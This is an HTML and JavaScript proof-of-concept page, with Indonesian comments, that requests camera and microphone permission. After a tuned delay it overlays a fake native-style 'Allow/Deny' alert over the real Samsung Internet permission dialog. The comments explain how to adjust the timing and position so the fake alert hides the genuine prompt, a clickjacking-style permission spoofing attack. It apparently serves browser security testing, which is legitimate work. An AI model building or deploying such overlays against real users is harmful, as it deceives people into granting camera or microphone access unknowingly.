<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Permission Test</title>
<style>
  body { margin: 0; font-family: sans-serif; background: #111; color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
  button { padding: 15px 30px; font-size: 18px; margin: 10px; border: none; border-radius: 8px; cursor: pointer; }
  #log { margin-top: 20px; font-size: 14px; color: #888; text-align: center; padding: 0 20px; }

  /* Fake native-style alert — muncul di bawah, menimpa area dialog izin asli */
  #fakeAlert {
    display: none;
    position: fixed;
    bottom: 25vh;                 /* turunkan/naikkan sesuai posisi dialog asli */
    left: 50%; transform: translateX(-50%);
    width: 88%; max-width: 340px;
    background: #fff; color: #202124;
    border-radius: 16px;
    padding: 22px 20px 16px;
    box-shadow: 0 6px 24px rgba(0,0,0,0.55);
    font-size: 15px; line-height: 1.4;
    z-index: 10000;
  }
  #fakeAlert .msg { margin-bottom: 18px; font-weight: 500; }
  #fakeAlert .btns {
    display: flex; justify-content: flex-end; gap: 6px;
    padding-right: 24px;          /* geser tombol kanan sedikit ke kiri */
  }
  #fakeAlert .btns button {
    margin: 0; padding: 10px 20px; font-size: 15px; border-radius: 20px;
  }
  #fDeny  { background: transparent; color: #1a73e8; }
  #fAllow { background: #1a73e8; color: #fff; }

  #debug { position: fixed; top: 5px; right: 5px; font-size: 11px; color: #666; }
</style>
</head>
<body>
<button onclick="triggerCam()">Request Camera</button>
<button onclick="triggerMic()">Request Microphone</button>
<button onclick="triggerBoth()">Request Both</button>
<div id="log"></div>
<div id="debug"></div>

<div id="fakeAlert">
  <div class="msg" id="fakeMsg">Alert</div>
  <div class="btns">
    <button id="fDeny">Deny</button>
    <button id="fAllow">Allow</button>
  </div>
</div>

<script>
const log = document.getElementById('log');
const fakeAlert = document.getElementById('fakeAlert');

// Delay sebelum fake alert muncul — tune sampai fake alert muncul
// TEPAT saat dialog izin asli Samsung Internet selesai muncul.
const FAKE_DELAY_MS = 400;

async function requestPerm(constraints) {
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    stream.getTracks().forEach(t => t.stop());
    log.textContent = 'GRANTED';
  } catch (e) {
    log.textContent = 'error: ' + e.name;
  }
}

function trigger(constraints, label) {
  // Kirim request — dialog izin asli Samsung akan muncul di bawah layar
  requestPerm(constraints);

  // Munculkan fake alert pada timing yang disinkronkan
  document.getElementById('fakeMsg').textContent = label;
  setTimeout(() => {
    fakeAlert.style.display = 'block';
    document.getElementById('debug').textContent = 'fake alert shown @ ' + Date.now();
  }, FAKE_DELAY_MS);
}

function triggerCam() { trigger({ video: true }, 'This site wants to use your camera'); }
function triggerMic() { trigger({ audio: true }, 'This site wants to use your microphone'); }
function triggerBoth(){ trigger({ video: true, audio: true }, 'This site wants to use your camera and microphone'); }

document.getElementById('fAllow').addEventListener('click', () => {
  fakeAlert.style.display = 'none';
  log.textContent = 'fake Allow tapped';
});
document.getElementById('fDeny').addEventListener('click', () => {
  fakeAlert.style.display = 'none';
  log.textContent = 'fake Deny tapped';
});
</script>
</body>
</html>
